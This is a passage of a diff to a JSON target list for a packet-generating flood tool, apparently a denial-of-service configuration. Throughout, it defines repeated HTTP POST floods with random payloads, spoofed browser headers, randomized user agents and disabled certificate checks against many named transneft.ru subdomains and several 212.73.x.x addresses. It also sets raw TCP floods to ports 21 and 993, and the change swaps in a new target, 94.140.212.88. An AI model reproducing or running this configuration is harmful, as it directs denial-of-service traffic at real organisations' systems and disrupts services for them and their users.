-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://212.73.103.135",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.135:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://212.73.103.135",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://212.73.103.135",
-                                "Referer": "http://212.73.103.135",
-                                "X-Forwarded-Host": "212.73.103.135",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://pfo.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "pfo.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://pfo.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://pfo.transneft.ru",
-                                "Referer": "http://pfo.transneft.ru",
-                                "X-Forwarded-Host": "pfo.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://gw-test.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "gw-test.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://gw-test.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://gw-test.transneft.ru",
-                                "Referer": "https://gw-test.transneft.ru",
-                                "X-Forwarded-Host": "gw-test.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.97.200:21",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.97.200:21"
+                        "address": "94.140.212.88:8080"
                     }
                 },
                 "packet": {
@@ -2918,17 +1314,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://auth.transneft.ru",
+            "count": 11,
+            "name": "http://94.140.212.88",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "auth.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "94.140.212.88:80"
                     }
                 },
                 "packet": {
@@ -2936,7 +1329,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://auth.transneft.ru",
+                            "path": "http://94.140.212.88",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -2949,518 +1342,12 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://auth.transneft.ru",
-                                "Referer": "https://auth.transneft.ru",
-                                "X-Forwarded-Host": "auth.transneft.ru",
+                                "Origin": "http://94.140.212.88",
+                                "Referer": "http://94.140.212.88",
+                                "X-Forwarded-Host": "94.140.212.88",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://gw-ak.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "gw-ak.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://gw-ak.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://gw-ak.transneft.ru",
-                                "Referer": "https://gw-ak.transneft.ru",
-                                "X-Forwarded-Host": "gw-ak.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://gw-ak2.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "gw-ak2.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://gw-ak2.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://gw-ak2.transneft.ru",
-                                "Referer": "https://gw-ak2.transneft.ru",
-                                "X-Forwarded-Host": "gw-ak2.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://av.ak.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "av.ak.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://av.ak.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://av.ak.transneft.ru",
-                                "Referer": "https://av.ak.transneft.ru",
-                                "X-Forwarded-Host": "av.ak.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://cp.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "cp.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://cp.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cp.transneft.ru",
-                                "Referer": "https://cp.transneft.ru",
-                                "X-Forwarded-Host": "cp.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://cpgw.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "cpgw.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://cpgw.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cpgw.transneft.ru",
-                                "Referer": "https://cpgw.transneft.ru",
-                                "X-Forwarded-Host": "cpgw.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://nsiws.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "nsiws.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://nsiws.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://nsiws.transneft.ru",
-                                "Referer": "https://nsiws.transneft.ru",
-                                "X-Forwarded-Host": "nsiws.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.233",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.233:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.233",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.233",
-                                "Referer": "https://212.73.103.233",
-                                "X-Forwarded-Host": "212.73.103.233",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://meet.ak.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "meet.ak.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://meet.ak.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://meet.ak.transneft.ru",
-                                "Referer": "https://meet.ak.transneft.ru",
-                                "X-Forwarded-Host": "meet.ak.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.241",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.241:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.241",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.241",
-                                "Referer": "https://212.73.103.241",
-                                "X-Forwarded-Host": "212.73.103.241",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.246",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.246:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.246",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.246",
-                                "Referer": "https://212.73.103.246",
-                                "X-Forwarded-Host": "212.73.103.246",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://_autodiscover._tcp.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "_autodiscover._tcp.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://_autodiscover._tcp.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://_autodiscover._tcp.transneft.ru",
-                                "Referer": "https://_autodiscover._tcp.transneft.ru",
-                                "X-Forwarded-Host": "_autodiscover._tcp.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.103.156:993",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.156:993"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
